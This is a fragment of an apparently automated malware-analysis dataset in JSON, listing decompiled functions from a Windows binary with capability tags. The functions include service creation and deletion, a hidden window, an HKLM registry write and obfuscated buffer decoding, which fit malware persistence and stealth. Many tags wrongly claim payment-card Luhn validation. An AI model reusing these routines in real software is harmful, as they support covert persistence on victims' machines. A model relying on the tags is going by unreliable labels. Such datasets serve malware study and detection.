        "decompiled_code": "\nint32_t fcn.00401180(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 48
    },
    "004011c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004012ad) overlaps instruction at (ram,0x004012a8)\n// \n// WARNING: Removing unreachable block (ram,0x0040122f)\n// WARNING: Removing unreachable block (ram,0x0040123d)\n// WARNING: Removing unreachable block (ram,0x00401239)\n// WARNING: Removing unreachable block (ram,0x00401285)\n// WARNING: Removing unreachable block (ram,0x004012b9)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004011c0(uchar *arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    uint32_t in_ECX;\n    uchar *puVar5;\n    uint unaff_EBX;\n    uchar *puVar6;\n    uchar *unaff_ESI;\n    ushort in_SS;\n    bool bVar7;\n    bool bVar8;\n    uint8_t uStackY31;\n    uint32_t uVar9;\n    \n    puVar6 = &stack0xfffffffc;\n    *arg_8h = 0x90;\n    uVar9 = in_ECX & 0xffff | in_EAX << 0x10;\n    uVar2 = in_EAX & 0xffffff00;\n    uVar3 = in_ECX & 0xffff00ff;\n    puVar5 = arg_8h;\n    do {\n        uVar4 = uVar3;\n        bVar7 = puVar5 <= uVar4;\n        uVar3 = uVar9 & 0xffff;\n        uVar2 = uVar2 & 0xffff0000 | uVar9 >> 0x10;\n        puVar5[1] = 0x2c;\n        if ((bVar7 && uVar4 != 1) && (!bVar7 || uVar4 == 1)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        puVar5[2] = 99;\n        uStackY31 = unaff_EBX >> 8;\n        bVar8 = (puVar5 & 0x1200) == 0;\n        bVar7 = (POPCOUNT(puVar5 >> 8 & 0x12) & 1U) == 0;\n        arg_8h[3] = 8;\n        uVar9 = uVar9 >> 0x10 | arg_8h << 0x10;\n        arg_8h[4] = 0xeb;\n        puVar5 = arg_8h;\n        if ((bVar7) || (!bVar7)) goto code_r0x00401264;\n        puVar1 = segment(in_SS, *0x10 + -0x18);\n        uVar2 = *puVar1;\n        puVar5 = 0xb7bc9ea5;\n    } while (bVar7);\n    bVar8 = *0x10 == 0x14;\n    bVar7 = (POPCOUNT(&stack0xffffffec & 0xff) & 1U) == 0;\n    uVar2 = uVar2;\ncode_r0x00401264:\n    puVar5[5] = 0xc4;\n    uVar3 = uVar2;\n    if ((!bVar8) && (bVar8)) {\n        uVar3 = uVar2 & 0xe2f4cc58;\n        bVar8 = uVar3 == 0;\n        bVar7 = (POPCOUNT(uVar2 & 0x58) & 1U) == 0;\n    }\n    puVar5[6] = 0xe1;\n    if ((!bVar8) && (bVar8)) {\n        uVar3 = uVar3 & 0xffffff00 | *0x4bb148d3;\n        out(*unaff_ESI, puVar5);\n    }\n    puVar5[7] = 0xfe;\n    if ((bVar7) || (!bVar7)) {\n        puVar5[8] = 0xfa;\n    }\n    else {\n        puVar6 = *0xc617b43a;\n        puVar5 = uVar3 + 1 & 0xffffff00 | uVar3 + 1 | uStackY31;\n    }\n    puVar5[9] = 0xff;\n    puVar5[10] = 0x31;\n    **(puVar6 + 0xc) = 0xb;\n    return;\n}\n",
        "token_count": 1038
    },
    "00401320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040136a) overlaps instruction at (ram,0x00401365)\n// \n// WARNING: Removing unreachable block (ram,0x0040133e)\n// WARNING: Removing unreachable block (ram,0x00401347)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401320(uint *arg_8h, uint *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t extraout_CL;\n    int32_t iVar2;\n    uint arg_ch_00;\n    uint *puVar3;\n    bool bVar4;\n    char cVar5;\n    char cVar6;\n    ulong uVar7;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    cVar6 = '\\0';\n    cVar5 = '\\0';\n    bVar4 = true;\n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uVar7 = fcn.004011c0(&var_68h, &var_4h);\n    arg_ch_00 = var_4h;\n    if ((!bVar4 && cVar6 == cVar5) && (bVar4 || cVar6 != cVar5)) {\n        puVar1 = uVar7 + -0x74c625aa;\n        *puVar1 = *puVar1 ^ extraout_CL;\n        arg_ch_00 = uVar7 >> 0x20;\n    }\n    fcn.00401480(&var_68h, arg_ch_00, 0x407028, 0xa100);\n    *arg_8h = 0x407028;\n    *arg_ch = 0xa100;\n    return;\n}\n",
        "token_count": 476
    },
    "004014f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004014f0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 132
    },
    "00401760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401760(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x411128, 0x4225b8, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 139
    },
    "00401c00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401c00(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t in_EDX;\n    int32_t unaff_EBX;\n    int32_t unaff_EDI;\n    bool in_CF;\n    uchar in_SF;\n    float10 extraout_ST0;\n    \n    if ((!in_CF) && (in_CF)) {\n        in_SF = unaff_EBX + *(unaff_EBX + 0x69 + in_EDX * 4) + in_CF < 0;\n    }\n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = extraout_ST0;\n        arg_8h_00 = arg_8h_00 + 5;\n    }\n    uVar1 = fcn.00402a30(arg_8h_00, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 264
    },
    "00401d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401db7) overlaps instruction at (ram,0x00401db5)\n// \n\nvoid __cdecl fcn.00401d80(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    int32_t unaff_EBX;\n    uint32_t uVar4;\n    bool in_CF;\n    \n    if ((!in_CF) && (in_CF)) {\n        unaff_EBX = unaff_EBX + *(unaff_EBX + 0x69 + in_EDX * 4) + in_CF;\n    }\n    uVar4 = 0;\n    uVar1 = arg_ch;\n    if (arg_ch != 0) {\n        do {\n            if ((uVar1 < 0) || (uVar1 >= 0)) {\n                iVar2 = (*_sym.imp.MSVCRT.dll_rand)(unaff_EBX);\n                in_ECX = 0x1a;\n                in_EDX = iVar2 % 0x1a;\n            }\n            else {\n                *(in_ECX + 0x1ab9) = *(in_ECX + 0x1ab9) + arg_8h;\n                arg_8h = arg_8h & 0xffff0000 | CONCAT11((arg_8h >> 8) + (in_EDX >> 8), arg_8h);\n            }\n            uVar3 = in_EDX + 0x61;\n            in_EDX = in_EDX & 0xffffff00 | uVar3;\n            *(uVar4 + arg_8h) = uVar3;\n            uVar4 = uVar4 + 1;\n            uVar1 = uVar4 - arg_ch;\n        } while (uVar4 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 429
    },
    "00402900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040292f) overlaps instruction at (ram,0x0040292d)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00402900(char *arg_8h, int32_t arg_ch, char *arg_10h, char *arg_14h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    char cVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint *unaff_ESI;\n    char *pcVar6;\n    char *pcVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    \n    pcVar4 = arg_8h + (arg_ch - arg_14h);\n    bVar8 = (POPCOUNT(pcVar4 & 0xff) & 1U) == 0;\n    if ((bVar8) || (!bVar8)) {\n        in_AF = 0;\n        if (arg_14h == NULL) {\n            return arg_8h;\n        }\n        if (arg_14h < 1) goto joined_r0x00402944;\n    }\n    else {\n        puVar2 = unaff_ESI + 1;\n        out(*unaff_ESI, arg_14h);\n        do {\n            cVar3 = arg_8h >> 8;\n            in_AF = 9 < (arg_8h & 0xf) | in_AF;\n            arg_8h = CONCAT31(CONCAT21(arg_8h >> 0x10, cVar3 - in_AF), -in_AF);\n            unaff_ESI = puVar2;\n        } while (in_AF || cVar3 == *arg_14h);\n    }\n    piVar1 = arg_ch + arg_14h * 2;\n    *piVar1 = (*piVar1 + 0x7b) - in_AF;\n    *(pcVar4 + -0x7b) = arg_8h;\n    (&stack0x0000007a)[pcVar4 * 2] = (&stack0x0000007a)[pcVar4 * 2] << (pcVar4 & 0x1f);\n    arg_8h = arg_8h & 0xffff0000 | CONCAT11(arg_8h >> 8 | *(unaff_ESI + 0x56), arg_8h);\njoined_r0x00402944:\n    do {\n        if (pcVar4 < arg_8h) {\n            return NULL;\n        }\n        if (*arg_8h == *arg_10h) {\n            bVar8 = true;\n            pcVar5 = arg_14h;\n            pcVar6 = arg_8h;\n            pcVar7 = arg_10h;\n            do {\n                pcVar7 = pcVar7 + 1;\n                pcVar6 = pcVar6 + 1;\n                pcVar5 = pcVar5 + -1;\n                if (pcVar5 == NULL) break;\n                bVar8 = *pcVar6 == *pcVar7;\n            } while (bVar8);\n            if (bVar8) {\n                return arg_8h;\n            }\n        }\n        arg_8h = arg_8h + 1;\n    } while( true );\n}\n",
        "token_count": 730
    },
    "00402c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402cb3) overlaps instruction at (ram,0x00402cb2)\n// \n// WARNING: Removing unreachable block (ram,0x00402cb0)\n\nuint __cdecl fcn.00402c80(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint *puVar5;\n    uint **ppuVar6;\n    uint **ppuVar7;\n    bool bVar8;\n    uint *puStack16;\n    \n    uVar3 = arg_ch;\n    uVar2 = arg_8h;\n    puVar5 = &stack0xfffffffc;\n    puStack16 = &arg_ch;\n    iVar4 = fcn.00404a60(arg_8h, arg_ch, &arg_8h);\n    bVar8 = iVar4 == 0;\n    if (bVar8) {\n        return 0;\n    }\n    *(iVar4 + 0x58) = arg_ch;\n    ppuVar7 = &stack0xfffffffc;\n    puStack16 = extraout_ECX;\n    if ((!bVar8) && (ppuVar7 = &stack0xfffffffc,  puStack16 = extraout_ECX,  bVar8)) {\n        ppuVar6 = &puStack16;\n        ppuVar7 = &puStack16;\n        cVar1 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            ppuVar6 = ppuVar6 + -1;\n            *ppuVar6 = *puVar5;\n            cVar1 = cVar1 + -1;\n            puStack16 = &stack0xfffffffc;\n        } while ('\\0' < cVar1);\n    }\n    fcn.00404a60(uVar2, uVar3, ppuVar7 + 8, ppuVar7 + 0xc);\n    return 1;\n}\n",
        "token_count": 446
    },
    "00402cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402cf0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00403dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403dd0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00404bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404bcd) overlaps instruction at (ram,0x00404bc8)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __fastcall fcn.00404bb0(uint param_1, uint32_t param_2, uchar *param_3, uint *param_4)\n\n{\n    char in_AL;\n    int16_t iVar1;\n    int32_t unaff_EBX;\n    uchar *unaff_ESI;\n    int32_t unaff_EDI;\n    bool in_PF;\n    bool in_ZF;\n    bool bVar2;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_PF) || (!in_PF)) {\n        *param_3 = 0x93;\n        if ((in_ZF || in_OF != in_SF) || (!in_ZF && in_OF == in_SF)) {\n            param_3[1] = 100;\n            bVar2 = (param_2 & 0x1200) == 0;\n            param_3[2] = 100;\n            if ((!bVar2) && (bVar2)) {\n                out(*unaff_ESI, param_2);\n            }\n            param_3[3] = 0xbd;\n            if ((!bVar2) && (bVar2)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            param_3[4] = 0x94;\n            param_3[5] = 0x9b;\n            param_3[6] = 0x50;\n            param_3[7] = 0x7e;\n            *param_4 = 8;\n            return;\n        }\n    }\n    else {\n        *(unaff_EBX + -0x7499f382) = *(unaff_EBX + -0x7499f382) + in_AL;\n        iVar1 = (param_2 + 1) * *0x34a96c7f;\n        param_3 = param_2 + 1 & 0xffff0000 | iVar1 / *(unaff_EDI + 4) & 0xffU | iVar1 % *(unaff_EDI + 4) << 8;\n    }\n    *(param_3 + -0x80) = &stack0xfffffff0 + *(param_3 + -0x80);\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 556
    },
    "00404c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404ccf) overlaps instruction at (ram,0x00404cce)\n// \n// WARNING: Removing unreachable block (ram,0x00404cc1)\n// WARNING: Removing unreachable block (ram,0x00404ccb)\n// WARNING: Removing unreachable block (ram,0x00404ccf)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00404c90(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar2 = &uStack107;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404bb0(&uStack108, &uStack8);\n    fcn.00401480(&uStack108, uStack8, 0x4115ac, 0x11000);\n    *param_1 = 0x4115ac;\n    *param_2 = 0x11000;\n    return;\n}\n",
        "token_count": 320
    },
    "00404d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404d40(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4225ec == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4225ec = 1;\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00404d90": {
        "rules": [
            "contain loop",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404dac) overlaps instruction at (ram,0x00404da8)\n// \n\nuint __fastcall fcn.00404d90(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    int32_t **unaff_EDI;\n    bool in_CF;\n    char in_ZF;\n    bool bVar2;\n    \n    do {\n        if ((in_CF) || (!in_CF)) break;\n        param_1 = param_1 + -1;\n    } while (param_1 != 0 && in_ZF != '\\0');\n    iVar1 = *unaff_ESI;\n    *unaff_EDI = unaff_ESI + 1;\n    *(iVar1 >> 0x1f) = *(iVar1 >> 0x1f) + (param_1 >> 8) + in_CF;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    bVar2 = iVar1 == 0;\n    if (!bVar2) {\n        if ((!bVar2) && (bVar2)) {\n            iVar1 = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 288
    },
    "00402670": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402670(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4112f4, 0x411338, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    },
    "004049e0": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004049f7) overlaps instruction at (ram,0x004049f4)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004049e0(uint hSCManager, uint hSCObject)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 153
    }
}